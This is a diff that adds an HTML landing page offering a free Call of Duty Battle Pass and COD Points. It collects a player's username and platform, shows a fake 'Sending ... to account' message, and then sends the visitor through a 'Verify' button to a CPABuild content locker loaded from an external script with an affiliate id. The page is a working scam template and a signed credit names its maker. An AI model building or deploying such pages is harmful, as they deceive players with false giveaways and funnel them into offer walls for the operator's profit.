@@ -1,0 +1,115 @@
+<!doctype html>
+<html>
+
+<head>
+  <title>Free Battle Pass and COD Points</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="tailwind.min.css" rel="stylesheet">
+  <link href="main.css" rel="stylesheet">
+  <link rel="icon" type="image/ico" href="favicon.ico">
+  <script type="text/javascript">
+    var CPABUILDSETTINGS={"it":2648042,"key":"aed3e"};
+  </script>
+  <script src="https://dby7kx9z9yzse.cloudfront.net/24ffb88.js"></script>
+</head>
+
+<body>
+
+    <div class="mx-auto min-h-screen w-full text-center justify-center items-center flex flex-col">
+
+      <div class="STEP-1 w-full h-screen text-center justify-center items-center flex flex-col">
+
+        <!--<img src="logo-4.png">-->
+
+        <img src="logo-5.png">
+
+        <h1 class="text-white text-3xl md:text-4xl Podkova P-BG uppercase mb-2 w-4/5 md:w-auto">Get Call of Duty Battle Pass <br> and COD Points for free.</h1>
+
+        <button type="button" class="COD-B text-3xl md:text-4xl pointer" onclick="STEP1();"><div class="TEST pointer mx-auto">Continue</div></button>
+
+      </div>
+
+      <div class="STEP-2 w-full h-screen text-center justify-center items-center flex flex-col hidden">
+
+        <!--<img src="logo-4.png">-->
+
+        <div class="XD h-1/2 bottom-12 fixed w-11/12 md:w-1/2 md:h-2/3 md:bottom-4 md:left-12 z-20 flex flex-col md:justify-center">
+        
+          <div class="EHH-1">
+
+            <h1 class="text-white text-3xl md:text-4xl Alegreya w-11/12 tracking-wide mx-auto mb-2">Enter your username and select your platform:</h1>
+
+            <input type="text" class="COD-I text-3xl md:text-4xl w-11/12 md:w-2/3 tracking-wide mb-2 placeholder-black placeholder-opacity-50" placeholder="Your CoD username" id="CODU">
+
+            <div class="grid grid-cols-3 w-3/4 md:w-1/2 mx-auto">
+
+              <div class="mx-1 cursor-pointer opacity-50 PL w-4/5 mx-auto bg-yellow-200" onclick="PLATFORM(this);" id="Windows"><div class="C3PO"><img class="w-full p-2 md:p-4" src="windows.png"></div></div>
+
+              <div class="mx-1 cursor-pointer opacity-50 PL w-4/5 mx-auto bg-red-200" onclick="PLATFORM(this);" id="psn"><div class="C3PO"><img class="w-full p-2 md:p-4" src="playstation.png"></div></div>
+
+              <div class="mx-1 cursor-pointer opacity-50 PL w-4/5 mx-auto bg-green-200" onclick="PLATFORM(this);" id="xbl"><div class="C3PO"><img class="w-full p-2 md:p-4" src="xbox.png"></div></div>
+
+            </div>
+
+            <button type="button" class="COD-B text-3xl md:text-4xl pointer mt-2 w-11/12 md:w-2/3" onclick="STEP2();"><div class="TEST pointer mx-auto">Continue</div></button>
+            
+          </div>
+          
+          <div class="EHH-2 hidden">
+
+            <h1 class="text-white text-3xl md:text-4xl Alegreya w-11/12 tracking-wide mx-auto mb-2">Do you want to get Season 4 Battle Pass?</h1>
+
+            <div class="flex">
+
+              <button type="button" class="COD-B text-3xl md:text-4xl pointer mt-2 w-1/2 mx-2" onclick="STEP3(false);"><div class="TEST pointer mx-auto">No</div></button>
+
+              <button type="button" class="COD-B text-3xl md:text-4xl pointer mt-2 w-1/2 mx-2" onclick="STEP3(true);"><div class="TEST pointer mx-auto">Yes</div></button>
+
+            </div>
+
+          </div>
+
+          <div class="EHH-3 hidden">
+
+            <h1 class="text-white text-3xl md:text-4xl Alegreya w-11/12 tracking-wide mx-auto mb-2">Select how much COD Points you want to get</h1>
+
+            <div class="grid grid-cols-3 w-full mx-auto md:w-2/3">
+
+              <div class="mx-1 border B-G cursor-pointer opacity-50 COD" name="2400" onclick="CODP(this);"><img src="2400.jpg" class="w-full"></div>
+              <div class="mx-1 border B-G cursor-pointer opacity-50 COD" name="5000" onclick="CODP(this);"><img src="5000.jpg" class="w-full"></div>
+              <div class="mx-1 border B-G cursor-pointer opacity-50 COD" name="9500" onclick="CODP(this);"><img src="9500.jpg" class="w-full"></div>
+
+            </div>
+
+            <button type="button" class="COD-B text-3xl md:text-4xl pointer mt-2 w-11/12 md:w-2/3" onclick="STEP4();"><div class="TEST pointer mx-auto">Continue</div></button>
+
+          </div>
+
+          <div class="FINAL hidden">
+
+            <h1 class="text-white text-2xl md:text-4xl Alegreya w-11/12 tracking-wide mx-auto mb-2">Sending <span id="CPCP" class="underline"></span> <span id="AND"></span> <span id="BPBP" class="underline"></span> to <span id="USUS" class="underline"></span> account. Please complete verification by clicking the button below to finish generation proccess.</h1>
+
+            <button type="button" class="COD-B text-3xl md:text-4xl pointer mt-2 w-11/12 md:w-1/2" onclick="CPABuildLock()"><div class="TEST pointer mx-auto">Verify</div></button>
+
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="VIGNETTE"></div>
+
+    <div class="NOISE"></div>
+
+    <!--LP MADE BY FLICK (back in business)-->
+    <!--Skype: flicks1337-->
+
+    <script src="jquery-3.6.0.min.js"></script>
+    <script src="main.js"></script>
+
+</body>
+
+</html>
